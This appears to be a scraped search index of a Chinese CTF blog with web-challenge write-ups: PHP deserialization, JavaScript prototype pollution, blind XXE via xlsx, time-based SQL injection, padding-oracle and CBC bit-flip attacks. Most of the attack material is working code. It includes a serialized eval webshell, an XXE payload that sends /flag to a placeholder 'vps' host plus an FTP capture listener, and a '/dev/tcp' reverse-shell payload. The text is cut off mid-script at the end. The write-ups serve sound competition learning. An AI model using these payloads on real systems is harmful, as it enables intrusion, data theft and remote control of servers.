continue 使用工具:\nburpsuite插件HTTP Request Smuggler\nhttps://github.com/defparam/smuggler\n参考\nhttps://mp.weixin.qq.com/s/MFw7Trd-zFWNXsU3wTG_Mg\nhttps://portswigger.net/web-security/request-smuggling/exploiting\n","permalink":"https://ch3n9w.github.io/posts/sec-http-smuggling/","summary":"\u003cp\u003e正常的请求\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-20211114141452612.png\" alt=\"image-20211114141452612\"  /\u003e\n\u003c/p\u003e","title":"http请求走私笔记"},{"content":" web越來越没有牌面了\u0026hellip;国赛果然是pwn和misc的天下\neasyphp 要让子进程异常退出, 先打印出php的所有内置函数然后爆破发包发现这个函数可以让他异常退出\na=stream_socket_server babyunserialize 传入flag并对flag进行反序列化, 搜索__destruct函数后决定用jip.php\nfunction __destruct() { if ($this-\u0026gt;lazy) { $this-\u0026gt;lazy = FALSE; foreach ($this-\u0026gt;data?:[] as $file =\u0026gt; $data) $this-\u0026gt;write($file,$data); } } function write($file,array $data=NULL) { if (!$this-\u0026gt;dir || $this-\u0026gt;lazy) return count($this-\u0026gt;data[$file]=$data); $fw=\\Base::instance(); switch ($this-\u0026gt;format) { case self::FORMAT_JSON: $out=json_encode($data,JSON_PRETTY_PRINT); break; case self::FORMAT_Serialized: $out=$fw-\u0026gt;serialize($data); break; } return $fw-\u0026gt;write($this-\u0026gt;dir.$file,$out); } exp如下\n\u0026lt;?php namespace DB{ class jig{ const FORMAT_JSON=1, FORMAT_Serialized=0; protected $dir; protected $data; protected $lazy; protected $format; public function __construct($dir,$data,$lazy) { $this-\u0026gt;data = $data; $this-\u0026gt;dir = $dir; $this-\u0026gt;lazy = $lazy; $this-\u0026gt;format = 0; } } } namespace ddd{ $a = new \\DB\\jig(\u0026#34;/var/www/html/\u0026#34;, [\u0026#34;kkk.php\u0026#34;=\u0026gt; [\u0026#39;\u0026lt;?php eval($_POST[1]);?\u0026gt;\u0026#39;]], True); echo urlencode(serialize($a)); } ?\u0026gt; littlegame javascript原型链污染\n关键代码\nrouter.post(\u0026#34;/DeveloperControlPanel\u0026#34;, function (req, res, next) { // not implement if (req.body.key === undefined || req.body.password === undefined){ res.send(\u0026#34;What\u0026#39;s your problem?\u0026#34;); }else { let key = req.body.key.toString(); let password = req.body.password.toString(); if(Admin[key] === password){ res.send(process.env.flag); }else { res.send(\u0026#34;Wrong password!Are you Admin?\u0026#34;); } } }); router.get(\u0026#39;/SpawnPoint\u0026#39;, function (req, res, next) { req.session.knight = { \u0026#34;HP\u0026#34;: 1000, \u0026#34;Gold\u0026#34;: 10, \u0026#34;Firepower\u0026#34;: 10 } res.send(\u0026#34;Let\u0026#39;s begin!\u0026#34;); }); router.post(\u0026#34;/Privilege\u0026#34;, function (req, res, next) { // Why not ask witch for help? if(req.session.knight === undefined){ res.redirect(\u0026#39;/SpawnPoint\u0026#39;); }else{ if (req.body.NewAttributeKey === undefined || req.body.NewAttributeValue === undefined) { res.send(\u0026#34;What\u0026#39;s your problem?\u0026#34;); }else { let key = req.body.NewAttributeKey.toString(); let value = req.body.NewAttributeValue.toString(); setFn(req.session.knight, key, value); res.send(\u0026#34;Let\u0026#39;s have a check!\u0026#34;); } } }); 污染req.session.knight\nexp如下\nimport requests url = \u0026#34;http://eci-2ze9505q64pi24hxhzqj.cloudeci1.ichunqiu.com:8888/\u0026#34; data1 = { \u0026#34;NewAttributeKey\u0026#34;:\u0026#34;constructor.prototype.ch3n9w\u0026#34;, \u0026#34;NewAttributeValue\u0026#34;:\u0026#34;1234\u0026#34; } data2 = { \u0026#34;key\u0026#34;:\u0026#39;ch3n9w\u0026#39;, \u0026#39;password\u0026#39;:\u0026#39;1234\u0026#39; } sess = requests.Session() sess.get(url+\u0026#34;SpawnPoint\u0026#34;) sess.post(url+\u0026#34;Privilege\u0026#34;,data=data1) r = sess.post(url+\u0026#34;DeveloperControlPanel\u0026#34;,data=data2) print(r.text) rceme 搜索发现https://www.anquanke.com/post/id/212603#h2-0, 拿着payload直接打就可以了\neasytrick \u0026lt;?php class trick{ public $trick1; public $trick2; public function __construct($a, $b) { $this-\u0026gt;trick1 = $a; $this-\u0026gt;trick2 = $b; } public function __destruct(){ $this-\u0026gt;trick1 = (string)$this-\u0026gt;trick1; if(strlen($this-\u0026gt;trick1) \u0026gt; 5 || strlen($this-\u0026gt;trick2) \u0026gt; 5){ die(\u0026#34;你太长了\u0026#34;); } if($this-\u0026gt;trick1 !== $this-\u0026gt;trick2 \u0026amp;\u0026amp; md5($this-\u0026gt;trick1) === md5($this-\u0026gt;trick2) \u0026amp;\u0026amp; $this-\u0026gt;trick1 != $this-\u0026gt;trick2){ echo file_get_contents(\u0026#34;/flag\u0026#34;); } } } $a = new trick(INF, INF); echo urlencode(serialize($a)); ","permalink":"https://ch3n9w.github.io/posts/ctf-ciscn2020-online/","summary":"\u003cblockquote\u003e\n\u003cp\u003eweb越來越没有牌面了\u0026hellip;国赛果然是pwn和misc的天下\u003c/p\u003e\n\u003c/blockquote\u003e","title":"ciscn2020_online"},{"content":"filejava 提供了文件上传和下载的功能, 在下载功能那里我们可以任意文件读取, 通过把文件名换成文件夹名字可以在报错中爆出绝对路径, 如图:\n绝对路径\n/usr/local/tomcat/webapps/ROOT/WEB-INF/upload/0/10/ 读文件/etc/passwd\n读日志文件 logs/catalina.out\n​ 发现有一个war包,下载下来进行源码审计, 发现一处突兀的地方\nif (filename.startsWith(\u0026#34;excel-\u0026#34;) \u0026amp;\u0026amp; \u0026#34;xlsx\u0026#34;.equals(fileExtName)) try { Workbook wb1 = WorkbookFactory.create(in); Sheet sheet = wb1.getSheetAt(0); System.out.println(sheet.getFirstRowNum()); } catch (InvalidFormatException e) { System.err.println(\u0026#34;poi-ooxml-3.10 has something wrong\u0026#34;); e.printStackTrace(); } 这里会对exce开头而且后缀名为xlsx的文件进行一个解析, 考虑一下使用xlsx来进行blind xxe, 具体可以参考 https://www.jishuwen.com/d/2inW/zh-hk\n新建一个xlsx文档, 解压, 修改Content_Types.xml的内容为\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE r [ \u0026lt;!ENTITY % data3 SYSTEM \u0026#34;file:///flag\u0026#34;\u0026gt; \u0026lt;!ENTITY % sp SYSTEM \u0026#34;http://vps/ext.dtd\u0026#34;\u0026gt; %sp; %param3; %exfil; ]\u0026gt; 在vps上的web目录下面放置一个ext.dtd, 内容如下:\n\u0026lt;!ENTITY % param3 \u0026#34;\u0026lt;!ENTITY \u0026amp;#37; exfil SYSTEM \u0026#39;ftp://vps/%data3;\u0026#39;\u0026gt;\u0026#34;\u0026gt; vps上开启ftp监听脚本, 脚本如下\n#!/usr/env/python from __future__ import print_function import socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) s.bind((\u0026#39;0.0.0.0\u0026#39;,21)) s.listen(1) print(\u0026#39;XXE-FTP listening \u0026#39;) conn,addr = s.accept() print(\u0026#39;Connected by %s\u0026#39;,addr) conn.sendall(\u0026#39;220 Staal XXE-FTP\\r\\n\u0026#39;) stop = False while not stop: dp = str(conn.recv(1024)) if dp.find(\u0026#34;USER\u0026#34;) \u0026gt; -1: conn.sendall(\u0026#34;331 password please - version check\\r\\n\u0026#34;) else: conn.sendall(\u0026#34;230 more data please!\\r\\n\u0026#34;) if dp.find(\u0026#34;RETR\u0026#34;)==0 or dp.find(\u0026#34;QUIT\u0026#34;)==0: stop = True if dp.find(\u0026#34;CWD\u0026#34;) \u0026gt; -1: print(dp.replace(\u0026#39;CWD \u0026#39;,\u0026#39;/\u0026#39;,1).replace(\u0026#39;\\r\\n\u0026#39;,\u0026#39;\u0026#39;),end=\u0026#39;\u0026#39;) else: print(dp) conn.close() s.close() 将修改内容后的文档文件重新全部压缩成xlsx文档, 发送, vps有回显\n注意, 直接nc 21端口不会看到数据, 至于为什么以后再研究一下\nnotes 源码\nvar express = require(\u0026#39;express\u0026#39;); var path = require(\u0026#39;path\u0026#39;); const undefsafe = require(\u0026#39;undefsafe\u0026#39;); const { exec } = require(\u0026#39;child_process\u0026#39;); var app = express(); class Notes { constructor() { this.owner = \u0026#34;whoknows\u0026#34;; this.num = 0; this.note_list = {}; } write_note(author, raw_note) { this.note_list[(this.num++).toString()] = {\u0026#34;author\u0026#34;: author,\u0026#34;raw_note\u0026#34;:raw_note}; } get_note(id) { var r = {} undefsafe(r, id, undefsafe(this.note_list, id)); return r; } edit_note(id, author, raw) { undefsafe(this.note_list, id + \u0026#39;.author\u0026#39;, author); undefsafe(this.note_list, id + \u0026#39;.raw_note\u0026#39;, raw); } get_all_notes() { return this.note_list; } remove_note(id) { delete this.note_list[id]; } } var notes = new Notes(); notes.write_note(\u0026#34;nobody\u0026#34;, \u0026#34;this is nobody\u0026#39;s first note\u0026#34;); app.set(\u0026#39;views\u0026#39;, path.join(__dirname, \u0026#39;views\u0026#39;)); app.set(\u0026#39;view engine\u0026#39;, \u0026#39;pug\u0026#39;); app.use(express.json()); app.use(express.urlencoded({ extended: false })); app.use(express.static(path.join(__dirname, \u0026#39;public\u0026#39;))); app.get(\u0026#39;/\u0026#39;, function(req, res, next) { res.render(\u0026#39;index\u0026#39;, { title: \u0026#39;Notebook\u0026#39; }); }); app.route(\u0026#39;/add_note\u0026#39;) .get(function(req, res) { res.render(\u0026#39;mess\u0026#39;, {message: \u0026#39;please use POST to add a note\u0026#39;}); }) .post(function(req, res) { let author = req.body.author; let raw = req.body.raw; if (author \u0026amp;\u0026amp; raw) { notes.write_note(author, raw); res.render(\u0026#39;mess\u0026#39;, {message: \u0026#34;add note sucess\u0026#34;}); } else { res.render(\u0026#39;mess\u0026#39;, {message: \u0026#34;did not add note\u0026#34;}); } }) app.route(\u0026#39;/edit_note\u0026#39;) .get(function(req, res) { res.render(\u0026#39;mess\u0026#39;, {message: \u0026#34;please use POST to edit a note\u0026#34;}); }) .post(function(req, res) { let id = req.body.id; let author = req.body.author; let enote = req.body.raw; if (id \u0026amp;\u0026amp; author \u0026amp;\u0026amp; enote) { notes.edit_note(id, author, enote); res.render(\u0026#39;mess\u0026#39;, {message: \u0026#34;edit note sucess\u0026#34;}); } else { res.render(\u0026#39;mess\u0026#39;, {message: \u0026#34;edit note failed\u0026#34;}); } }) app.route(\u0026#39;/delete_note\u0026#39;) .get(function(req, res) { res.render(\u0026#39;mess\u0026#39;, {message: \u0026#34;please use POST to delete a note\u0026#34;}); }) .post(function(req, res) { let id = req.body.id; if (id) { notes.remove_note(id); res.render(\u0026#39;mess\u0026#39;, {message: \u0026#34;delete done\u0026#34;}); } else { res.render(\u0026#39;mess\u0026#39;, {message: \u0026#34;delete failed\u0026#34;}); } }) app.route(\u0026#39;/notes\u0026#39;) .get(function(req, res) { let q = req.query.q; let a_note; if (typeof(q) === \u0026#34;undefined\u0026#34;) { a_note = notes.get_all_notes(); } else { a_note = notes.get_note(q); } res.render(\u0026#39;note\u0026#39;, {list: a_note}); }) app.route(\u0026#39;/status\u0026#39;) .get(function(req, res) { let commands = { \u0026#34;script-1\u0026#34;: \u0026#34;uptime\u0026#34;, \u0026#34;script-2\u0026#34;: \u0026#34;free -m\u0026#34; }; for (let index in commands) { exec(commands[index], {shell:\u0026#39;/bin/bash\u0026#39;}, (err, stdout, stderr) =\u0026gt; { if (err) { return; } console.log(`stdout: ${stdout}`); }); } res.send(\u0026#39;OK\u0026#39;); res.end(); }) app.use(function(req, res, next) { res.status(404).send(\u0026#39;Sorry cant find that!\u0026#39;); }); app.use(function(err, req, res, next) { console.error(err.stack); res.status(500).send(\u0026#39;Something broke!\u0026#39;); }); const port = 8080; app.listen(port, () =\u0026gt; console.log(`Example app listening at http://localhost:${port}`)) undefsafe这个库存在原型链污染漏洞, 具体见链接https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940\n然后看到status那里存在命令执行, 那么思路就是污染commands, 让其中有我们想要执行的命令\npayload\nPOST /edit_note HTTP/1.1 {\u0026#34;id\u0026#34;:\u0026#34;__proto__\u0026#34;,\u0026#34;author\u0026#34;:\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/xxx/xxx 0\u0026gt;\u0026amp;1\u0026#34;,\u0026#34;raw\u0026#34;:\u0026#34;aaa\u0026#34;} 记得要把contenttype改成application/json, 然后访问一下status就可以获得反弹shell了.\ntrace 脚本跑着跑着环境就崩掉了, 环境不太稳定, 不得不改成二分法减少请求数量之后才把flag一次性跑出来了\nimport requests import time url = \u0026#34;http://3039266414b24d4a9f755321e1184a5548ffce8270ee4588.changame.ichunqiu.com/register_do.php\u0026#34; flag = \u0026#34;\u0026#34; index = 1 while True: u_bound = 255; l_bound=0; while u_bound \u0026gt;= l_bound: m_bound = (u_bound + l_bound) // 2 payload = \u0026#34;2\u0026#39;^if(ascii(substr((select `2` from (select 1,2 union select * from flag)a limit 1,1),{0},1))\u0026gt;{1},sleep(3),1),\u0026#39;1\u0026#39;)#\u0026#34;.format(index, m_bound) data = { \u0026#39;username\u0026#39;:payload, \u0026#39;password\u0026#39;:\u0026#39;hello\u0026#39; } print(data) t1 = time.time() res = requests.post(url, data=data) t2 = time.time() if t2 - t1 \u0026gt; 3: l_bound = m_bound + 1 else: u_bound = m_bound - 1 tmp = m_bound flag += chr(tmp) print(flag) index += 1 AreUSerialz 题目源码\n\u0026lt;?php include(\u0026#34;flag.php\u0026#34;); highlight_file(__FILE__); class FileHandler { protected $op; protected $filename; protected $content; function __construct() { $op = \u0026#34;1\u0026#34;; $filename = \u0026#34;/tmp/tmpfile\u0026#34;; $content = \u0026#34;Hello World!\u0026#34;; $this-\u0026gt;process(); } public function process() { if($this-\u0026gt;op == \u0026#34;1\u0026#34;) { $this-\u0026gt;write(); } else if($this-\u0026gt;op == \u0026#34;2\u0026#34;) { $res = $this-\u0026gt;read(); $this-\u0026gt;output($res); } else { $this-\u0026gt;output(\u0026#34;Bad Hacker!\u0026#34;); } } private function write() { if(isset($this-\u0026gt;filename) \u0026amp;\u0026amp; isset($this-\u0026gt;content)) { if(strlen((string)$this-\u0026gt;content) \u0026gt; 100) { $this-\u0026gt;output(\u0026#34;Too long!\u0026#34;); die(); } $res = file_put_contents($this-\u0026gt;filename, $this-\u0026gt;content); if($res) $this-\u0026gt;output(\u0026#34;Successful!\u0026#34;); else $this-\u0026gt;output(\u0026#34;Failed!\u0026#34;); } else { $this-\u0026gt;output(\u0026#34;Failed!\u0026#34;); } } private function read() { $res = \u0026#34;\u0026#34;; if(isset($this-\u0026gt;filename)) { $res = file_get_contents($this-\u0026gt;filename); } return $res; } private function output($s) { echo \u0026#34;[Result]: \u0026lt;br\u0026gt;\u0026#34;; echo $s; } function __destruct() { if($this-\u0026gt;op === \u0026#34;2\u0026#34;) $this-\u0026gt;op = \u0026#34;1\u0026#34;; $this-\u0026gt;content = \u0026#34;\u0026#34;; $this-\u0026gt;process(); } } function is_valid($s) { for($i = 0; $i \u0026lt; strlen($s); $i++) if(!(ord($s[$i]) \u0026gt;= 32 \u0026amp;\u0026amp; ord($s[$i]) \u0026lt;= 125)) return false; return true; } if(isset($_GET{\u0026#39;str\u0026#39;})) { $str = (string)$_GET[\u0026#39;str\u0026#39;]; if(is_valid($str)) { $obj = unserialize($str); } } 这个题目要求我们传入的payload中不可以有不可见字符, 但是众所周知, protected属性在序列化之后是会带上不可见字符的, 那该怎么办呢? 其实在php高版本中, 对变量的类型放宽了限制, 也就是说, 就算把protected属性改成public属性后构造payload传入也是可以正常解析的, 至于要让op等于\u0026quot;2\u0026quot;的限制, 只要利用一下php弱类型比较, 让op等于数字2就行.\n看Y1ng师傅的wp https://www.gem-love.com/websecurity/2322.html?tdsourcetag=s_pctim_aiomsg 中提到了\n看看p神在知识星球中说的就明白了\n","permalink":"https://ch3n9w.github.io/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/","summary":"\u003ch2 id=\"filejava\"\u003efilejava\u003c/h2\u003e\n\u003cp\u003e提供了文件上传和下载的功能, 在下载功能那里我们可以任意文件读取, 通过把文件名换成文件夹名字可以在报错中爆出绝对路径, 如图:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/images/image-20200511193913736.png\" alt=\"image-20200511193913736\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003e绝对路径\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e/usr/local/tomcat/webapps/ROOT/WEB-INF/upload/0/10/\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e读文件/etc/passwd\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/images/image-20200511194357766.png\" alt=\"image-20200511194357766\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003e读日志文件 \u003ccode\u003elogs/catalina.out\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e​        \u003cimg loading=\"lazy\" src=\"/images/qBJnenyW6ts6Vglb.png__thumbnail\" alt=\"img\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003e发现有一个war包,下载下来进行源码审计, 发现一处突兀的地方\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e        if (filename.startsWith(\u0026#34;excel-\u0026#34;) \u0026amp;\u0026amp; \u0026#34;xlsx\u0026#34;.equals(fileExtName))\n          try {\n            Workbook wb1 = WorkbookFactory.create(in);\n            Sheet sheet = wb1.getSheetAt(0);\n            System.out.println(sheet.getFirstRowNum());\n          } catch (InvalidFormatException e) {\n            System.err.println(\u0026#34;poi-ooxml-3.10 has something wrong\u0026#34;);\n            e.printStackTrace();\n          }  \n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这里会对exce开头而且后缀名为xlsx的文件进行一个解析, 考虑一下使用xlsx来进行blind xxe, 具体可以参考 \u003ca href=\"https://www.jishuwen.com/d/2inW/zh-hk\"\u003ehttps://www.jishuwen.com/d/2inW/zh-hk\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e新建一个xlsx文档, 解压, 修改\u003ccode\u003eContent_Types.xml\u003c/code\u003e的内容为\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-xml\" data-lang=\"xml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u0026lt;!DOCTYPE r [\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u0026lt;!ENTITY % data3 SYSTEM \u0026#34;file:///flag\u0026#34;\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u0026lt;!ENTITY % sp SYSTEM \u0026#34;http://vps/ext.dtd\u0026#34;\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e%sp;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e%param3;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e%exfil;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e]\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e在vps上的web目录下面放置一个\u003ccode\u003eext.dtd\u003c/code\u003e, 内容如下:\u003c/p\u003e","title":"网鼎杯2020 web"},{"content":"padding oracle 原理: https://www.freebuf.com/articles/database/150606.html\n[NPUCTF2020]web狗 打开来看到了源代码\n\u0026lt;?php error_reporting(0); include(\u0026#39;config.php\u0026#39;); # $key,$flag define(\u0026#34;METHOD\u0026#34;, \u0026#34;aes-128-cbc\u0026#34;); //定义加密方式 define(\u0026#34;SECRET_KEY\u0026#34;, $key); //定义密钥 define(\u0026#34;IV\u0026#34;,\u0026#34;6666666666666666\u0026#34;); //定义初始向量 16个6 define(\u0026#34;BR\u0026#34;,\u0026#39;\u0026lt;br\u0026gt;\u0026#39;); if(!isset($_GET[\u0026#39;source\u0026#39;]))header(\u0026#39;location:./index.php?source=1\u0026#39;); #var_dump($GLOBALS); //听说你想看这个？ function aes_encrypt($iv,$data) { echo \u0026#34;--------encrypt---------\u0026#34;.BR; echo \u0026#39;IV:\u0026#39;.$iv.BR; return base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR; } function aes_decrypt($iv,$data) { return openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) or die(\u0026#39;False\u0026#39;); } if($_GET[\u0026#39;method\u0026#39;]==\u0026#39;encrypt\u0026#39;) { $iv = IV; $data = $flag; echo aes_encrypt($iv,$data); } else if($_GET[\u0026#39;method\u0026#39;]==\u0026#34;decrypt\u0026#34;) { $iv = @$_POST[\u0026#39;iv\u0026#39;]; $data = @$_POST[\u0026#39;data\u0026#39;]; echo aes_decrypt($iv,$data); } echo \u0026#34;我摊牌了，就是懒得写前端\u0026#34;.BR; if($_GET[\u0026#39;source\u0026#39;]==1)highlight_file(__FILE__); ?\u0026gt; 使用padding oracle attack来解出明文内容, 这里比较简单, 明文长度仅仅只有一个分组, 只需要修改iv求出中间值之后和原来的iv进行抑或操作就可以得到明文了, 脚本如下\nimport base64 import requests import time url = \u0026#34;http://71a04ae9-0b21-46fd-a550-d1aa35a3619a.node3.buuoj.cn/index.php?method=decrypt\u0026amp;source=0\u0026#34; encrypt = \u0026#34;ly7auKVQCZWum/W/4osuPA==\u0026#34; enc = base64.b64decode(encrypt.encode(\u0026#34;utf8\u0026#34;)) iv = b\u0026#34;6666666666666666\u0026#34; get = \u0026#34;\u0026#34; for i in range(1, 17): for j in range(0,256): iv_tmp = chr(0)*(16-i) + chr(j) + \u0026#34;\u0026#34;.join([chr(ord(get[n]) ^ i) for n in range(len(get))]) data = { \u0026#39;iv\u0026#39;:iv_tmp, \u0026#39;data\u0026#39;:encrypt } res = requests.post(url,data=data) print(res.text) time.sleep(1.5) if \u0026#34;False\u0026#34; not in res.text: get = chr(j ^ i)+ get print(get) print(base64.b64encode(get.encode(\u0026#34;utf8\u0026#34;))) break print(base64.b64encode(get.encode(\u0026#34;utf8\u0026#34;))) 得到了一个地址, 访问之发现下一个问题考察cbc字节翻转攻击,题目如下\n\u0026lt;?php #error_reporting(0); include(\u0026#39;config.php\u0026#39;); //$fl4g define(\u0026#34;METHOD\u0026#34;, \u0026#34;aes-128-cbc\u0026#34;); define(\u0026#34;SECRET_KEY\u0026#34;, \u0026#34;6666666\u0026#34;); session_start(); function get_iv(){ //生成随机初始向量IV $random_iv=\u0026#39;\u0026#39;; for($i=0;$i\u0026lt;16;$i++){ $random_iv.=chr(rand(1,255)); } return $random_iv; } $lalala = \u0026#39;piapiapiapia\u0026#39;; if(!isset($_SESSION[\u0026#39;Identity\u0026#39;])){ $_SESSION[\u0026#39;iv\u0026#39;] = get_iv(); $_SESSION[\u0026#39;Identity\u0026#39;] = base64_encode(openssl_encrypt($lalala, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $_SESSION[\u0026#39;iv\u0026#39;])); } echo base64_encode($_SESSION[\u0026#39;iv\u0026#39;]).\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; if(isset($_POST[\u0026#39;iv\u0026#39;])){ $tmp_id = openssl_decrypt(base64_decode($_SESSION[\u0026#39;Identity\u0026#39;]), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_POST[\u0026#39;iv\u0026#39;])); echo $tmp_id.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; if($tmp_id ===\u0026#39;weber\u0026#39;)die($fl4g); } highlight_file(__FILE__); ?\u0026gt; 脚本, 注意这里需要将字符串补全到16个字节\nimport base64 target = b\u0026#39;weber\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\u0026#39; orginal = b\u0026#39;piapiapiapia\\x04\\x04\\x04\\x04\u0026#39; iv = base64.b64decode(\u0026#34;JLSjjNcJ+cOULHUC0DhRSw==\u0026#34;) result = b\u0026#39;\u0026#39; for i in range(16): result += bytes([target[i] ^ iv[i] ^ orginal[i]]) print(base64.b64encode(result)) [CISCN2019 东北赛区 Day2 Web3]Point System 打开是一个登录界面, 访问robots.txt, 发现一个html, 里面是很多api\n试着按照里面的使用方法来注册一个用户, 然后回到登录界面登录提示权限不足, 看看浏览器的network\n除了向login和info都请求了一次, 看看详情\n向login发请求后返回的是\n{\u0026#34;code\u0026#34;:100,\u0026#34;data\u0026#34;:{\u0026#34;token\u0026#34;:\u0026#34;eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWjZsY3ZSbnFBWVpSQmF6Y2UrNVg3dFJJNkdsa3JDVUtaby9qNzJxdnE5TjRHZVNpc2ozQlZZWXZ0OFkzVkZQd2t0SUR5c21DSk10SjdFQWtZSDVTRS93PT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoiTFQ0NXNSOU5SMWpxR0ZsWWJtMUxzeDhWM2l1NEpQT3YiLCJleHBpcmVfaW4iOjE1ODA2Njg5NTF9\u0026#34;}} 向info请求的头中\nCookie: Key=eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWjZsY3ZSbnFBWVpSQmF6Y2UrNVg3dFJJNkdsa3JDVUtaby9qNzJxdnE5TjRHZVNpc2ozQlZZWXZ0OFkzVkZQd2t0SUR5c21DSk10SjdFQWtZSDVTRS93PT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoiTFQ0NXNSOU5SMWpxR0ZsWWJtMUxzeDhWM2l1NEpQT3YiLCJleHBpcmVfaW4iOjE1ODA2Njg5NTF9 请求后返回的是\n{\u0026#34;code\u0026#34;:100,\u0026#34;data\u0026#34;:{\u0026#34;user_role\u0026#34;:3,\u0026#34;uid\u0026#34;:1}} token解码一下看看\n{\u0026#34;signed_key\u0026#34;:\u0026#34;SUN4a1NpbmdEYW5jZVJhUHsFQR4ln5VFC9L09echkYhTWQgiwZohj27JWt98/+1Z6lcvRnqAYZRBazce+5X7tRI6GlkrCUKZo/j72qvq9N4GeSisj3BVYYvt8Y3VFPwktIDysmCJMtJ7EAkYH5SE/w==\u0026#34;,\u0026#34;role\u0026#34;:3,\u0026#34;user_id\u0026#34;:1,\u0026#34;payload\u0026#34;:\u0026#34;LT45sR9NR1jqGFlYbm1Lsx8V3iu4JPOv\u0026#34;,\u0026#34;expire_in\u0026#34;:1580668951} sign_key解码看看\nICxkSingDanceRaP{\u0005A\u001e%E\u000bÒôõç!SY\b\u0026#34;Á!nÉZß|ÿíYêW/FzaAk7\u001eûûµ\u0012:\u001aY+\tB£øûÚ«êôÞ\u0006y(¬pUaíñÕ\u0014ü$´ò²`2Ò{\u0010\t\u0018\u001fÿ \u0026ldquo;我蔡徐坤唱跳rap\u0026rdquo;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;.然后后面是乱码, 这个玩意就是cbc加密的特征, 那么signed_key就是cbc加密后经过base64的密文, 还得用padding oracle attack解出明文来\n解密过程:\nC1 ^ 中间值的最后一位 = 0×01 中间值的最后一位 = C1 ^ 0×01 C1 ^ 中间值的最后2位 = 0×02 0x02 中间值的最后2位 = C1 ^ (0×02 0x02) .... 一直到推出整个C2的中间值,和C1异或就得到了C2的明文 同理, 可以破解整个明文\n这是从其他师傅偷过来的脚本\nimport time import requests import base64 import json host = \u0026#34;938a4575-3337-42bd-b712-45b008d529c5.node3.buuoj.cn\u0026#34; port = \u0026#34;\u0026#34; def padding_oracle(key): user_key_decode = base64.b64decode(key) user_key_json_decode = json.loads(user_key_decode) signed_key = user_key_json_decode[\u0026#39;signed_key\u0026#39;] signed_key_decoded = base64.b64decode(signed_key) url = \u0026#34;http://\u0026#34; + host + \u0026#34;/frontend/api/v1/user/info\u0026#34; N = 16 total_plain = \u0026#39;\u0026#39; for block in range(0, len(signed_key_decoded) // 16 - 1): token = \u0026#39;\u0026#39; get = b\u0026#34;\u0026#34; # 对每一块密文 cipher = signed_key_decoded[16 + block * 16:32 + block * 16] # 对每一位 for i in range(1, N+1): # 爆破 for j in range(0, 256): time.sleep(0.1) # 已知位的padding对应的解密异或值 padding = b\u0026#34;\u0026#34;.join([(get[n] ^ i).to_bytes(1, \u0026#39;little\u0026#39;) for n in range(len(get))]) # 将解密异或值 和 这块密文作为一个signed_key尝试进行解密 c = b\u0026#39;\\x00\u0026#39; * (16 - i) + j.to_bytes(1, \u0026#39;little\u0026#39;) + padding + cipher #print(c) token = base64.b64encode(c) user_key_json_decode[\u0026#39;signed_key\u0026#39;] = token.decode(\u0026#34;utf-8\u0026#34;) header = {\u0026#39;Key\u0026#39;: base64.b64encode(bytes(json.dumps(user_key_json_decode), 